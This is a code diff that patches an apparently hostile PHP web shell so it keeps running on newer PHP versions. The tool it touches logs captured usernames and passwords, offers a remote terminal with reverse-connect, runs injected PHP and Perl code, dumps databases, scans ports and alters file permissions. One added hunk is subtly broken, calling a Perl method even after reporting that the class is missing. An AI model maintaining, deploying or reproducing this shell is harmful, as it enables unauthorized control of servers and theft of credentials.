@@ -114,7 +114,7 @@ function error ($errno, $errstr, $errfile, $errline)
 }
 
 // Login Request
-if(request_method=="POST")
+if($_SERVER['REQUEST_METHOD'] == "POST")
 {
 	if(any("username",$_REQUEST)&&any("password",$_REQUEST)&&any("signin",$_REQUEST))
 	{
@@ -132,12 +132,12 @@ if(request_method=="POST")
 			$log=array(
 				"Username: ".$_REQUEST['username'],
 				"Password: ".$_REQUEST['password'],
-				"Remote IP: ".remote_addr,
+				"Remote IP: ".$_SERVER['REMOTE_ADDR'],
 				"Time: ".date('Y-m-d H:i:s'),
 				"-------------------------\r\n",
 			);
 			$file=dirname(__FILE__)._.'.log';
-			$write_log=implode($log,"\r\n");
+			$write_log=implode("\r\n", $log);
 			$op=fopen($file,'a+');
 			fwrite($op,$write_log);
 			fclose($op);
@@ -349,7 +349,7 @@ $start=microtime(true);                    // Time Pageload
 	.menu-tools > ul{list-style:none;margin:0;padding:0}
 	.menu-tools > ul > li{margin:0 3px 0 0;padding:10px 7px 10px 7px;display:block;float:left}
 	.menu-tools > ul > li:hover{cursor:pointer}
-	.menu-directory{;margin-bottom:10px}
+	.menu-directory{margin-bottom:10px}
 	.new{margin-right:15px;}
 	.hash label{min-width:40px;display:inline-block;padding-right:15px}
 	.hash-capture label{margin:10px 0;display:inline-block}
@@ -624,7 +624,7 @@ function ChmodRecursive($x,$y)
 			{
 				if($f!="."&&$f!="..")
 				{
-					ChmodRecursive($x._.$f);
+					ChmodRecursive($x._.$f, $y);
 				}
 			}
 			closedir($h);
@@ -745,8 +745,8 @@ function GetUrlFromPath($x)
 {
 	$fix_path=str_replace(_,'/',$x);
 	$protocol=empty($_SERVER['HTTPS'])||$_SERVER['HTTPS']==='off'?'http://':'https://';
-	$path=str_replace(document_root,'',$fix_path);
-	return $protocol.server_name.$path;
+	$path=str_replace($_SERVER['DOCUMENT_ROOT'],'',$fix_path);
+	return $protocol.$_SERVER['SERVER_NAME'].$path;
 }
 
 function PostUrlContent($url,$content)
@@ -770,7 +770,7 @@ function PostUrlContent($url,$content)
 	else
 	{
 		//file_get_contents
-		if($contents=file_get_contents($url,null,$context))
+		if($contents=file_get_contents($url,false,$context))
 		{
 			$results=htmlspecialchars($contents);
 		}
@@ -1084,12 +1084,12 @@ printf("<div id='header'>
 			</div>
 		</div>
 		<div class='content'>",
-		php_uname(),server_software,
-		server_name,server_name,gethostbyname(http_host),server_port,
-		B64D($account[0]),remote_addr,remote_port,
+		php_uname(),$_SERVER['SERVER_SOFTWARE'],
+		$_SERVER['SERVER_NAME'],$_SERVER['SERVER_NAME'],gethostbyname($_SERVER['HTTP_HOST']),$_SERVER['SERVER_PORT'],
+		B64D($account[0]),$_SERVER['REMOTE_ADDR'],$_SERVER['REMOTE_PORT'],
 		GetUser("usr"),GetUser("uid"),GetUser("grp"),GetUser("gid"),
 		GetFileSize(@disk_free_space($dir)),GetFileSize(@disk_total_space($dir)),
-		php_sapi_name(),GetSafeMode(),php_self,$config['title'],$config['subtitle'],
+		php_sapi_name(),GetSafeMode(),$_SERVER['PHP_SELF'],$config['title'],$config['subtitle'],
 		MainMenu(),MapDrive($map),MapDirectory($map),$map
 );
 
@@ -1099,19 +1099,19 @@ if(any("g",$_REQUEST))
 
 	if (is_dir($g))
 	{
-		header('location:'.php_self.'?d='.urle($g));
+		header('location:'.$_SERVER['PHP_SELF'].'?d='.urle($g));
 	}
 	elseif(is_file($g)||is_link($g))
 	{
-		header('location:'.php_self.'?a=v&r='.urle($g));
+		header('location:'.$_SERVER['PHP_SELF'].'?a=v&r='.urle($g));
 	}
 	else
 	{
-		header('location:'.php_self);
+		header('location:'.$_SERVER['PHP_SELF']);
 	}
 }
 
-if(any("d",$_REQUEST)||request_uri===script_name)
+if(any("d",$_REQUEST)||$_SERVER['REQUEST_URI']===basename(__FILE__))
 {
 	$_SESSION['c']=urle($dir);
 
@@ -1127,7 +1127,7 @@ if(any("d",$_REQUEST)||request_uri===script_name)
 		{
 			$mf=@fopen($file,"w");
 			fclose($mf);
-			header("location:".php_self."?a=e&r=".urle($file));
+			header("location:".$_SERVER['PHP_SELF']."?a=e&r=".urle($file));
 		}
 	}
 	if(any("directory",$_REQUEST)&&$_REQUEST['directory']=="New Dir")
@@ -1291,7 +1291,7 @@ if(any("r",$_REQUEST))
 	{
 		$file=strval(urld($_REQUEST["r"]));
 		$status=any("status",$_SESSION)?$_SESSION['status']:"";
-		$back=php_self."?d=".urle($dir);
+		$back=$_SERVER['PHP_SELF']."?d=".urle($dir);
 
 		printf("<div class='divide'>
 				<div class='divide-left'>
@@ -1428,7 +1428,7 @@ if(any("r",$_REQUEST))
 				{
 					$_SESSION['status']="Whoops, something went wrong...";
 				}
-				header("location:".php_self."?a=e&r=".urle($file));
+				header("location:".$_SERVER['PHP_SELF']."?a=e&r=".urle($file));
 			}
 		}
 
@@ -1454,7 +1454,7 @@ if(any("r",$_REQUEST))
 				{
 				    $_SESSION['status']='Renamed file with success';
 				}
-				header("location:".php_self."?a=r&r=".urle($newname));
+				header("location:".$_SERVER['PHP_SELF']."?a=r&r=".urle($newname));
 			}
 		}
 
@@ -1479,7 +1479,7 @@ if(any("r",$_REQUEST))
 				{
 				    $_SESSION['status']='Chmod file with success';
 				}
-				header("location:".php_self."?a=c&r=".urle($file));
+				header("location:".$_SERVER['PHP_SELF']."?a=c&r=".urle($file));
 			}
 		}
 
@@ -1511,7 +1511,7 @@ if(any("r",$_REQUEST))
 				{
 				    $_SESSION['status']='Chown file with success';
 				}
-				header("location:".php_self."?a=cwn&r=".urle($file));
+				header("location:".$_SERVER['PHP_SELF']."?a=cwn&r=".urle($file));
 			}
 		}
 
@@ -1543,7 +1543,7 @@ if(any("r",$_REQUEST))
 				{
 					$_SESSION['status']='Chgrp file with success';
 				}
-				header("location:".php_self."?a=cgp&r=".urle($file));
+				header("location:".$_SERVER['PHP_SELF']."?a=cgp&r=".urle($file));
 			}
 		}
 
@@ -1568,7 +1568,7 @@ if(any("r",$_REQUEST))
 				{
 				    $_SESSION['status']='Touched file with success';
 				}
-				header("location:".php_self."?a=t&r=".urle($file));
+				header("location:".$_SERVER['PHP_SELF']."?a=t&r=".urle($file));
 			}
 		}
 
@@ -1725,11 +1725,11 @@ if(any("r",$_REQUEST))
 
 				if($_REQUEST['a']=='cp')
 				{
-					header("location:".php_self."?a=cp&r=".urle($file));
+					header("location:".$_SERVER['PHP_SELF']."?a=cp&r=".urle($file));
 				}
 				elseif($_REQUEST['a']=='mv')
 				{
-					header("location:".php_self."?a=mv&r=".urle($file));
+					header("location:".$_SERVER['PHP_SELF']."?a=mv&r=".urle($file));
 				}
 			}
 		}
@@ -1777,7 +1777,7 @@ if(any("x",$_REQUEST))
 	{
 		session_destroy();
 		session_regenerate_id();
-		header('location:'.php_self);
+		header('location:'.$_SERVER['PHP_SELF']);
 	}
 	if($_REQUEST['x']=="secure")
 	{
@@ -1877,7 +1877,7 @@ if(any("x",$_REQUEST))
 							<textarea>%s</textarea>
 						</fieldset>
 					</div>
-			</div>",$total,round($risk,2),round($secure,2),$table,implode($ready, ', '),implode($off, ', '),implode($die, ', '));
+			</div>",$total,round($risk,2),round($secure,2),$table,implode( ', ',$ready),implode( ', ',$off),implode( ', ',$die));
 	}
 	if($_REQUEST['x']=="info")
 	{
@@ -2044,7 +2044,7 @@ if(any("x",$_REQUEST))
 			if($cn)
 			{
 				$_SESSION['connect']=true;
-				header('location:'.php_self.'?x=db');
+				header('location:'.$_SERVER['PHP_SELF'].'?x=db');
 			}
 			else
 			{
@@ -2069,7 +2069,7 @@ if(any("x",$_REQUEST))
 				unset($_SESSION['dbas']);
 				unset($_SESSION['qdb']);
 				unset($_SESSION['qtb']);
-				header('location:'.php_self.'?x=db');
+				header('location:'.$_SERVER['PHP_SELF'].'?x=db');
 			}
 
 			$sql=!empty($_REQUEST['query'])?$_REQUEST['query']:"show databases;";
@@ -2230,7 +2230,7 @@ if(any("x",$_REQUEST))
 				$_SESSION['status']="<span class=off>Dump Error</span>";
 			}
 			
-			header('location:'.php_self.'?x=db');
+			header('location:'.$_SERVER['PHP_SELF'].'?x=db');
 		}
 
 	}
@@ -2317,7 +2317,7 @@ if(any("x",$_REQUEST))
 						<fieldset>
  							<legend>Status</legend>
 							<div id='connect-result'>Terminal: %s",
-							remote_addr,Execute('whoami') 
+							$_SERVER['REMOTE_ADDR'],Execute('whoami') 
 		);
 
 		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="reverse-connect")
@@ -2432,7 +2432,7 @@ if(any("x",$_REQUEST))
 				<div class='divide-right'>
 					<textarea>%s</textarea>
 				</div>
-			</div>",implode($php_ini,"\n"),implode($htaccess,"\n"));
+			</div>",implode("\n",$php_ini),implode("\n",$htaccess));
 	}
 	if($_REQUEST['x']=="php")
 	{	
@@ -2456,7 +2456,7 @@ if(any("x",$_REQUEST))
 						<input type='submit' id='php-submit' onclick=\"getAjax(false,'php-eval','POST','?x=php&codex='+document.getElementById('php-code').value);\" class='php-code' name=php-code cols=122 rows=20 value='Inject'/>
 						<input type='submit' id='php-submit' onclick=\"getAjax(false,'php-eval','POST','?x=php&code='+document.getElementById('php-code').value);\" class='php-code' name=php-code cols=122 rows=20 value='Run'/>
 					</form>
-				</div>",implode($exp,"\n"));
+				</div>",implode("\n",$exp));
 
 		if(any("code",$_REQUEST))
 		{
@@ -2522,8 +2522,8 @@ if(any("x",$_REQUEST))
 		$file=$path._.'perl.ler';
 		$file2=$path._.'.htaccess';
 
-		$scripts=implode($script,"\n");
-		$htaccesss=implode($htaccess,"\n");
+		$scripts=implode("\n",$script);
+		$htaccesss=implode("\n",$htaccess);
 
 		if(!is_dir($path))
 		{
@@ -2550,7 +2550,12 @@ if(any("x",$_REQUEST))
 		if (class_exists('Perl'))
 		{
 			//$perl=Perl::getInstance();
-			$perl=new Perl();
+			// Ensure the Perl class is defined or included
+			if (class_exists('Perl')) {
+				$perl = new Perl();
+			} else {
+				echo "Error: The 'Perl' class is not defined. Please include the required library.";
+			}
 			$perl->eval("print \"Executing Perl code in PHP\n\"");
 			print "Hello from PHP! ";
 
@@ -2604,7 +2609,7 @@ if(any("x",$_REQUEST))
 				</div>
 			</div>
 
-		",php_self);
+		",$_SERVER['PHP_SELF']);
 
 		if(any('xa',$_REQUEST)&&$_REQUEST['xa']=='send')
 		{
@@ -2723,7 +2728,7 @@ if(any("x",$_REQUEST))
 
 		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="change")
 		{
-			$filename=script_filename;
+			$filename=__FILE__;
 			$username=$_REQUEST['change-password'];
 			$password=$_REQUEST['change-username'];
 
@@ -2747,7 +2752,7 @@ if(any("x",$_REQUEST))
 				{
 					session_destroy();
 					session_regenerate_id();
-					header('location:'.php_self);
+					header('location:'.$_SERVER['PHP_SELF']);
 				}
 				else
 				{
@@ -2786,12 +2791,12 @@ if(any("x",$_REQUEST))
 
 		if(count($files)==1&&$value=='copy')
 		{
-			header('location:'.php_self.'?a=cp&r='.$files[0]);
+			header('location:'.$_SERVER['PHP_SELF'].'?a=cp&r='.$files[0]);
 		}
 
 		if(count($files)==1&&$value=='move')
 		{
-			header('location:'.php_self.'?a=mv&r='.$files[0]);
+			header('location:'.$_SERVER['PHP_SELF'].'?a=mv&r='.$files[0]);
 		}
 
 		if(!any('xa',$_REQUEST)&&$value=='delete')
@@ -3192,14 +3197,14 @@ if(any("z",$_REQUEST))
 				<input type='submit' value='Trace' onclick=\"return getAjax(true,'target-info','POST','?z=target-map&ip='+document.getElementById('map-ip').value);\"/><br>
 			</form>
 		</div>
-		<div id='target-info' class='result'></div>",gethostbyname(http_host));
+		<div id='target-info' class='result'></div>",gethostbyname($_SERVER['HTTP_HOST']));
 
 		if(any("ip",$_REQUEST))
 		{
 			ob_clean();
-			$ip=!empty($_REQUEST['ip']) ? $_REQUEST['ip'] : gethostbyname(http_host);
+			$ip=!empty($_REQUEST['ip']) ? $_REQUEST['ip'] : gethostbyname($_SERVER['HTTP_HOST']);
 			$valid=filter_var($ip,FILTER_VALIDATE_IP) or die('Invalid IP Address');
-			if($_REQUEST['ip']==gethostbyname(http_host)) 
+			if($_REQUEST['ip']==gethostbyname($_SERVER['HTTP_HOST'])) 
 			{
 				$url=B64D("zSI9xWleO7odODUdzH4qy79ezmMeyr1=");
 				$geoip=GetUrlContent($url);
@@ -3272,7 +3277,7 @@ if(any("z",$_REQUEST))
 						<input type='submit' onclick=\"return ajaxAbort(true,'port-result')\" value=Cancel />
 					</form>
 				</div>
-				<div id='port-result' class='result'></div>",gethostbyname(http_host));
+				<div id='port-result' class='result'></div>",gethostbyname($_SERVER['HTTP_HOST']));
 
 		if(any("x",$_REQUEST)&&$_REQUEST['x']=="scan-port")
 		{
@@ -3505,7 +3510,7 @@ if(any("z",$_REQUEST))
 		function chr_asc($str){
 			$asc='';
 			for($i=0;$i<strlen($str);$i++) 
-				$asc.=ord($str{$i}).' ';
+				$asc .= ord($str[$i]) . ' ';
 			return rtrim($asc);
 		}
 
@@ -3538,7 +3543,7 @@ if(any("z",$_REQUEST))
 		function hex_bin($hex){
 			$bin='';
 			for($i=0;$i<strlen($hex);$i++)
-				$bin.=str_pad(decbin(hexdec($hex{$i})),4,'0',STR_PAD_LEFT);
+				$bin.=str_pad(decbin(hexdec($hex[$i])),4,'0',STR_PAD_LEFT);
 			return $bin;
 		}
 
@@ -3595,8 +3600,8 @@ if(any("z",$_REQUEST))
 				$hash=$_REQUEST['hash'];
 				switch($hash)
 				{
-					case "chr-asc":print str_asc($text);break;
-					case "asc-chr":print asc_str($text);break;
+					case "chr-asc":print chr_asc($text);break;
+					case "asc-chr":print asc_chr($text);break;
 					case "asc-hex":print asc_hex($text);break;
 					case "hex-asc":print hex_asc($text);break;
 					case "hex-bin":print hex_bin($text);break;
@@ -3658,7 +3663,7 @@ if(any("z",$_REQUEST))
 						<div id='form-result' class='result'></div>
 					</fieldset>
 				</div>
-			</div>",implode($exp,"\n"));
+			</div>",implode("\n",$exp));
 
 		if(any("url",$_REQUEST)&&any("parameter",$_REQUEST))
 		{
